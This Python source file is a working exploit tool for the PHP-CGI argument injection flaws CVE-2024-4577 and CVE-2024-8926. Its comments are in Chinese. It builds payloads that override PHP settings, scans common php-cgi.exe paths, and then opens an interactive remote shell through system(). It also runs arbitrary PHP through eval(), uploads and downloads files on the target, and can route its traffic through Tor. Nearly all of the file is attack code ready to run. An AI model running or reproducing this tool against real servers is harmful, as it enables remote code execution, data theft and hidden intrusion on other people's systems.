import requests
import sys
import urllib3
import chardet
import os
import base64
import re
from urllib.parse import urlparse
import banner
import tor_helper

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Payload 參數庫
PAYLOAD_ELEMENTS = {
    1: "disable_functions%3d%26",           # 解除禁用的 PHP 函數
    2: "disable_classes%3d%26",             # 解除禁用的 PHP 類
    3: "open_basedir%3d",                   # 取消 open_basedir 限制
    4: "cgi.force_redirect%3d0",            # 讓 PHP CGI 在 Nginx 或 Apache 可執行
    5: "cgi.redirect_status_env",           # 允許 CGI 變數環境影響執行
    6: "allow_url_include%3d1",             # 允許 `include()` 遠程文件（RFI）
    7: "allow_url_fopen%3d1",               # 允許 `fopen()` 打開遠程文件
    8: "auto_prepend_file%3dphp://input",   # auto_prepend_file 用來執行自訂代碼
    9: "file_uploads%3d1",                  # 允許上傳檔案
    10: "upload_max_filesize%3d0",          # 取消上傳檔案大小限制
    11: "log_errors%3d0",                   # 關閉錯誤日誌記錄
    12: "post_max_size%3d0",                # 取消 POST 限制，允許無限大小
    13: "memory_limit%3d%2B1",              # 取消 PHP 記憶體限制
    14: "enable_dl%3d1",                    # 允許 `dl()` 動態載入擴展（PHP 7+ 已移除）
    15: "max_execution_time%3d0",           # 允許 PHP 無限執行時間
    16: "short_open_tag%3d1",               # 允許短標籤 `<?`
    17: "max_input_time%3d0",               # 允許無限輸入請求時間
    18: "expose_php%3d1"                    # 在 HTTP Header 顯示 PHP 版本資訊
}

# 預設 Payload 組合庫
PAYLOAD_COMBINATIONS = {
    "1": [1, 2, 3, 4, 5, 6, 7, 8], 
    "2": [1, 4, 5, 6, 8],  
    "3": [4, 6, 8],
    "4": [4, 8]
}

# 連接符
CVE_PREFIXES = {
    "CVE-2024-4577": "%ADd",
    "CVE-2024-8926": "%a8-d%a8"
}

# 全域設定
DEFAULT_TIMEOUT = 10
timeout_value = DEFAULT_TIMEOUT
enable_log = "--log" in sys.argv
use_tor = "--tor" in sys.argv  # 檢查是否啟用 Tor
tor_session = None 
selected_payload_group = "1" # 預設payload
VERBOSE_MODE = "--verbose" in sys.argv # 是否啟用詳細模式

# 組合 Payload
def generate_payload_groups():

    payload_groups = {}
    for group_id, elements in PAYLOAD_COMBINATIONS.items():
        payload_groups[group_id] = {
            cve: "+".join([f"{prefix}+{PAYLOAD_ELEMENTS[e]}" for e in elements])
            for cve, prefix in CVE_PREFIXES.items()
        }
    return payload_groups

# 自動生成 `PAYLOAD_GROUPS`
PAYLOAD_GROUPS = generate_payload_groups()

# Payload List排版
def format_payload(payload):
    
    parts = re.split(r'(%AD|%a8)', payload)  # 依 `%AD` 和 `%a8` 分割
    
    ad_count = 0  # 計算 `%AD` 的出現次數
    a8_count = 0  # 計算 `%a8` 的出現次數
    formatted_parts = []

    for part in parts:
        if part == "%AD":
            ad_count += 1
            if ad_count >= 2:  # 從第二個 `%AD` 開始換行
                formatted_parts.append("\n     " + part)
            else:
                formatted_parts.append(part)
        elif part == "%a8":
            a8_count += 1
            if a8_count % 2 == 1 and a8_count >= 3:  # 奇數次（從第 3 次開始）換行
                formatted_parts.append("\n     " + part)
            else:
                formatted_parts.append(part)
        else:
            formatted_parts.append(part)

    return ''.join(formatted_parts)

# Payload選擇
def get_selected_payload_group(args):
    """
    解析 `--payload` 參數：
    1. 如果 `--payload` 未提供，預設使用 `Payload 1`
    2. 如果 `--payload` 存在但未提供編號，列出可用 `Payload`
    3. 如果 `--payload` 提供無效編號，列出可用 `Payload`
    4. 如果 `--payload` 提供有效編號，直接使用該 `Payload`
    """
    global selected_payload_group, PAYLOADS

    # **預設使用 `Payload 1`（沒有 `--payload` 參數時）**
    if "--payload" not in args:
        selected_payload_group = "1"
        PAYLOADS = PAYLOAD_GROUPS[selected_payload_group]  # 確保 PAYLOADS 被更新
        return selected_payload_group, PAYLOADS

    # **當 `--payload` 存在但沒有指定編號**
    payload_index = args.index("--payload") + 1
    if payload_index >= len(args):  # `--payload` 沒有跟數字
        print("[!] 沒有指定 `Payload`，請手動選擇！")
        return show_payload_list()

    user_choice = args[payload_index]

    # **如果 `--payload` 指定的是有效編號，直接使用**
    if user_choice in PAYLOAD_GROUPS:
        selected_payload_group = user_choice
        PAYLOADS = PAYLOAD_GROUPS[selected_payload_group]  # **確保 PAYLOADS 被更新**
        return selected_payload_group, PAYLOADS

    # **如果 `--payload` 指定無效編號，列出可用 `Payload`**
    print("[!] 無效的 `Payload`，請手動選擇！")
    return show_payload_list()

# 顯示可用 `Payload`，讓使用者手動選擇
def show_payload_list():

    global selected_payload_group

    print("\n[!] 可用的 Payload 組合：")
    for idx in sorted(PAYLOAD_GROUPS.keys()):
        print(f"{idx}) 使用以下 Payloads:")
        for name, payload in PAYLOAD_GROUPS[idx].items():
            formatted_payload = format_payload(payload) # 排版
            print(f"   - {name}: \n     {formatted_payload}")

    while True:
        user_choice = input("[?] 請輸入對應的編號來切換 Payload 組或使用 C 自訂 Payload : ").strip()
        if user_choice in PAYLOAD_GROUPS:
            selected_payload_group = user_choice
            break
        elif user_choice.upper() == "C":
            print("\n[*] 進入自訂 Payload 模式...")
            selected_payload_group = customize_payload()
            break
        else:
            print("[!] 無效輸入，請輸入正確的數字或 `C` 來自訂 Payload！")

    return selected_payload_group, PAYLOAD_GROUPS[selected_payload_group]

# 自訂 Payload
def customize_payload():

    global PAYLOAD_COMBINATIONS, PAYLOAD_GROUPS, PAYLOADS, selected_payload_group

    print("\n==============================================")
    print("[*] 目前可用的 Payload 元素：")
    for key, value in PAYLOAD_ELEMENTS.items():
        print(f"{key}: {value}")
    print("==============================================\n")

    while True:
        user_input = input("[?] 請輸入要組合的元素編號（用空格分隔，例如 ： 1 3 5 7）：").strip()
        selected_elements = user_input.split()

        if all(e.isdigit() and int(e) in PAYLOAD_ELEMENTS for e in selected_elements):
            selected_elements = [int(e) for e in selected_elements]
            break
        else:
            print("[!] 無效輸入，請輸入可用的編號，用空格分隔！")

    # 生成新的 Payload 組合
    new_id = str(len(PAYLOAD_COMBINATIONS) + 1)
    PAYLOAD_COMBINATIONS[new_id] = selected_elements

    # 生成對應的 `CVE-2024-4577` 和 `CVE-2024-8926` Payload
    PAYLOAD_GROUPS[new_id] = {
        cve: "+".join([f"{prefix}+{PAYLOAD_ELEMENTS[e]}" for e in selected_elements])
        for cve, prefix in CVE_PREFIXES.items()
    }

    print("\n[+] 已成功新增自訂 Payload！")
    # print(f"[+] 編號: {new_id}")
    print(f"[*] CVE-2024-4577 Payload: \n    {PAYLOAD_GROUPS[new_id]['CVE-2024-4577']}")
    print(f"[*] CVE-2024-8926 Payload: \n    {PAYLOAD_GROUPS[new_id]['CVE-2024-8926']}\n")

    # **更新 `selected_payload_group` 並確保 `PAYLOADS` 變數同步更新**
    selected_payload_group = new_id
    PAYLOADS = PAYLOAD_GROUPS[selected_payload_group] 
    
    return new_id

# 自動轉換編碼
def decode_response(response):
    detected = chardet.detect(response.content)
    encoding = detected.get('encoding')
    return response.content.decode(encoding, errors='replace') if encoding else response.content.decode('utf-8', errors='replace')

# 發送請求
def send_request(url, data, timeout=None):
    try:
               
        if VERBOSE_MODE:
            print("\n==============================================")
            print(f"[*] 發送請求至: {url}")
            print(f"[*] 請求數據: {data}")
            print(f"[*] 超時設定: {timeout}")
            print("==============================================\n")
            
        if isinstance(data, str):
            data = data.encode("utf-8")  # 確保 data 內容為 UTF-8
            
        if use_tor:
            response = tor_session.post(url, data=data, timeout=timeout)
        else:
            response = requests.post(url, data=data, verify=False, timeout=timeout)
        
        if VERBOSE_MODE:
            print(f"[*] 回應狀態碼: {response.status_code}")
            print(f"[*] 回應內容: {response.text[:500]}\n")  # 只顯示前 500 個字元，避免溢出
        
        return decode_response(response)
    except Exception as e:
        print(f"[!] 請求錯誤: {e}")
        return None

# 枚舉注入點
def choose_cgipoint(url, payload_key):
    cgipoints = [
        "/php-cgi/php-cgi.exe", "/cgi-bin/php-cgi.exe",
        "/php-cgi.exe", "/cgi/php-cgi.exe", "/php.exe",
        "/cgi-bin/php.exe", "/cgi/php.exe",
        "/index.php", "/"
    ]
    test_payload = "<?php echo 'TEST_VULNTEST_CVE-2024-4577'; die(); ?>"
    
    if VERBOSE_MODE:
        print("\n==============================================")
        print(f"[*] 測試 Payload {payload_key}")
        print(f"[*] 當前 Payload: {PAYLOADS[payload_key]}")
        print("==============================================\n")
        
    for ep in cgipoints:
        target_url = f"{url}{ep}?{PAYLOADS[payload_key]}"
        resp = send_request(target_url, test_payload, timeout_value)
        if resp and 'TEST_VULNTEST_CVE-2024-4577' in resp:
            print(f"[+] 找到CGI注入點 : {ep} (漏洞: {payload_key})")
            return ep
    print(f"[-] 未找到漏洞 (CVE: {payload_key})")
    return None

# 移除不能用於檔名的字元
def sanitize_filename(filename):
    return re.sub(r'[\/:*?"<>|]', '_', filename)

# 以攻擊目標的 host 為基礎建立檔案名稱
def get_unique_filepath(directory, host):

    base_filename = sanitize_filename(host)
    candidate = os.path.join(directory, f"{base_filename}.txt")
    i = 1
    while os.path.exists(candidate):
        candidate = os.path.join(directory, f"{base_filename}_{i}.txt")
        i += 1
    return candidate

# 交互式shell
def exploit_shell(url, cgipoint, payload_key):
    print("[*] 輸入命令，輸入 exit 結束，可使用 --save 儲存單次輸出：")
    host = urlparse(url).netloc  # 取得目標網站的 host
    log_dir = os.path.join(os.getcwd(), "log")
    if enable_log :
        print("[*] log模式已啟動")
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)  # 確保 log 目錄存在
    log_path = os.path.join(log_dir, f"{host}.log") if enable_log else None

    while True:
        cmd = input("shell> ").strip()
        if cmd.lower() == "exit":
            break

        parts = cmd.split("--save")
        real_cmd = parts[0].strip()
        save_path = parts[1].strip() if len(parts) > 1 else None

        # 自動產生合法的儲存檔名 (以 Host 命名並自動編號)
        if save_path == "":
            save_dir = os.path.join(os.getcwd(), "output")
            if not os.path.exists(save_dir):
                os.makedirs(save_dir)
            save_path = get_unique_filepath(save_dir, host)

        real_cmd_encoded = base64.b64encode(real_cmd.encode()).decode()

        payload = f"<?php system(base64_decode('{real_cmd_encoded}')); die(); ?>"

        target_url = f"{url}{cgipoint}?{PAYLOADS[payload_key]}"
        resp = send_request(target_url, payload, timeout_value)
        output = resp.strip() if resp else ""

        print(output)

        if save_path:
            save_path = os.path.abspath(save_path)
            with open(save_path, "w", encoding="utf-8") as f:
                f.write(output)
            print(f"[+] 輸出結果已儲存至 {save_path}")

        if enable_log:
            with open(log_path, "a", encoding="utf-8") as f:
                f.write(f"CMD: {real_cmd}\n{output}\n{'-'*20}\n")

# 自訂php
def custom_php_mode(url, cgipoint, payload_key):
    print("[*] 輸入PHP程式碼，輸入 EOF 結束，可使用 --save 儲存輸出：")
    php_code = ""
    save_path = None
    host = urlparse(url).netloc  # 取得 Host，作為預設儲存檔名

    while True:
        line = input()
        if line.strip().startswith("EOF"):
            parts = line.split("--save")
            if len(parts) > 1:
                save_path = parts[1].strip()
                if save_path == "":
                    save_dir = os.path.join(os.getcwd(), "output")
                    if not os.path.exists(save_dir):
                        os.makedirs(save_dir)
                    save_path = get_unique_filepath(save_dir, host)  # 以 Host 命名檔案
            break
        php_code += line + "\n"

    php_code_encoded = base64.b64encode(php_code.encode()).decode()

    payload = f"<?php eval(base64_decode('{php_code_encoded}')); die(); ?>"

    target_url = f"{url}{cgipoint}?{PAYLOADS[payload_key]}"
    resp = send_request(target_url, payload, timeout_value)
    output = resp.strip() if resp else ""

    print(output)

    if save_path:
        save_path = os.path.abspath(save_path)
        with open(save_path, "w", encoding="utf-8") as f:
            f.write(output)
        print(f"[+] PHP輸出結果已儲存至 {save_path}")

# 取得目標網站的根目錄
def get_remote_docroot(url, cgipoint, payload_key):
    payload = "<?php echo $_SERVER['DOCUMENT_ROOT']; die(); ?>"
    target_url = f"{url}{cgipoint}?{PAYLOADS[payload_key]}"
    resp = send_request(target_url, payload, timeout_value)
    return resp.strip() if resp else None
    
# 上傳檔案
def upload_file(url, cgipoint, payload_key):
    local = input("本地檔案路徑：").strip()
    remote = input("目標完整路徑（若留空將上傳至網站根目錄）：").strip()
    
    if remote == "":
        docroot = get_remote_docroot(url, cgipoint, payload_key)
        if docroot:
            remote = os.path.join(docroot, os.path.basename(local)).replace("\\", "/")
            print(f"[*] 已自動設定上傳路徑為: {remote}")
        else:
            print("[!] 無法取得網站根目錄，請手動指定完整路徑")
            return

    try:
        with open(local, "rb") as f:
            encoded = base64.b64encode(f.read()).decode()
    except Exception as e:
        print(f"[!] 讀取本地檔案失敗: {e}")
        return
    
    payload = f"<?php file_put_contents('{remote}', base64_decode('{encoded}')); echo 'OK'; die(); ?>"
    resp = send_request(f"{url}{cgipoint}?{PAYLOADS[payload_key]}", payload)

    if resp and "OK" in resp:
        print(f"[+] 成功上傳至 {remote}")
    else:
        print("[!] 上傳失敗，無回應")

# 下載檔案
def download_file(url, cgipoint, payload_key):
    remote = input("遠端檔案路徑：").strip()
    local = os.path.join("download", os.path.basename(remote))
    if not os.path.exists("download"):
        os.makedirs("download")
    payload = f"<?php echo base64_encode(file_get_contents('{remote}')); die(); ?>"
    resp = send_request(f"{url}{cgipoint}?{PAYLOADS[payload_key]}", payload)
    if resp:
        with open(local, "wb") as f:
            f.write(base64.b64decode(resp.strip()))
        print(f"已下載至 {local}")

if __name__ == "__main__":

    if len(sys.argv) < 3 or sys.argv[1] != "-u":
        print("用法: python exploit.py -u <URL> [--timeout=秒] [--log] [--payload num] [--tor] [--verbose]")
        sys.exit(1)

    target = sys.argv[2] 
    
    # 播放開頭動畫
    use_tor = "--tor" in sys.argv
    banner.play_banner(use_tor)

    # 播放 Disclaimer
    banner.Show_Disclaimer()
    
    # 啟用 --tor 模式
    if use_tor:
        tor_session = tor_helper.get_tor_session()
        if not tor_session:
            sys.exit(1)  # Tor 無法啟動，終止腳本

    # 解析 `--payload`
    if "--payload" in sys.argv:
        payload_index = sys.argv.index("--payload") + 1
        if payload_index >= len(sys.argv):
            print("[!] 沒有指定有效的 Payload，請手動選擇！")
            selected_payload_group, PAYLOADS = get_selected_payload_group(sys.argv)
        else:
            user_choice = sys.argv[payload_index]
            if user_choice.upper() == "C":
                print("\n[*] 進入自訂 Payload 模式...")
                selected_payload_group = customize_payload()
                PAYLOADS = PAYLOAD_GROUPS[selected_payload_group]  # **確保 `PAYLOADS` 變數同步更新**
            elif user_choice in PAYLOAD_GROUPS:
                selected_payload_group = user_choice
                PAYLOADS = PAYLOAD_GROUPS[selected_payload_group]  # **確保 `PAYLOADS` 變數同步更新**
            else:
                print("[!] 無效的 Payload，請手動選擇！")
                selected_payload_group, PAYLOADS = get_selected_payload_group(sys.argv)
    else:
        # 未輸入 --payload，使用預設
        #print("[*] 未指定 --payload，預設使用 Payload 1")
        selected_payload_group = "1"
        PAYLOADS = PAYLOAD_GROUPS[selected_payload_group]  # **確保 `PAYLOADS` 變數同步更新**
 
    # timeout 檢查邏輯
    timeout_value = 10  # 預設值
    for arg in sys.argv:
        if arg.startswith("--timeout="):  # 確保有 `=`
            parts = arg.split("=")
            if len(parts) != 2 or not parts[1].isdigit():
                print("[!] 錯誤：請使用正確格式 --timeout=<秒數>，例如 --timeout=10")
                sys.exit(1)
            timeout_int = int(parts[1])
            if timeout_int == 0:
                timeout_value = None  # 無限等待
                print("[*] 已設置為無限等待")
            elif timeout_int > 60:
                print("[!] 等待時間過久 (超過 60 秒)，如需要無限等待請使用 --timeout=0")
                sys.exit(1)
            elif timeout_int > 30:
                print("[!] 警告：timeout 超過 30 秒，測試可能會耗時較久")
                timeout_value = timeout_int
            else:
                timeout_value = timeout_int
                print(f"[*] 設定請求超時時間為 {timeout_value} 秒")
        elif arg == "--timeout":  # 如果 `--timeout` 沒有 `=`
            print("[!] 錯誤：請使用 --timeout=<秒數>，例如 --timeout=10")
            sys.exit(1)
    while True:
        selected_cgipoint, selected_payload = None, None
        print("[*] 開始測試...")
        for p in PAYLOADS:
            ep = choose_cgipoint(target, p)
            if ep:
                selected_cgipoint, selected_payload = ep, p
                break
        if not selected_cgipoint:
            print("[-] 無漏洞，請重新指定目標或退出")

        while selected_cgipoint:
            print(f"\n[*] 當前目標: {target} (漏洞: {selected_payload})")
            print("模式選擇:")
            print("1) Shell模式 (使用system()執行命令)")
            print("2) PHP自訂義模式 (使用eval()執行任意代碼)")
            print("3) 上傳檔案")
            print("4) 下載檔案")
            print("5) 切換攻擊目標")
            print("6) 離開程式")

            choice = input(">> ").strip()
            if choice == "1":
                exploit_shell(target, selected_cgipoint, selected_payload)
            elif choice == "2":
                custom_php_mode(target, selected_cgipoint, selected_payload)
            elif choice == "3":
                upload_file(target, selected_cgipoint, selected_payload)
            elif choice == "4":
                download_file(target, selected_cgipoint, selected_payload)
            elif choice == "5":
                target = input("輸入新目標URL: ").strip()
                break
            elif choice == "6":
                print("[*] 程式結束")
                sys.exit(0)
            else:
                print("[!] 無效的選擇，請重新選擇")

        if not selected_cgipoint:
            print("\n[-] 未找到可用漏洞，請選擇下一步：")
            print("1) 重新輸入目標")
            print("2) 切換 Payload 並重新測試")
            print("3) 離開程式")

            next_action = input("\n>> ").strip()
            
            if next_action == "1":
                target = input("\n輸入新目標 URL: ").strip()
            elif next_action == "2":
                print("\n[!] 切換 Payload 中，請選擇新的 Payload")
                selected_payload_group, selected_payloads = show_payload_list()
                PAYLOADS = selected_payloads
            else:
                print("[*] 程式結束")
                sys.exit(0)



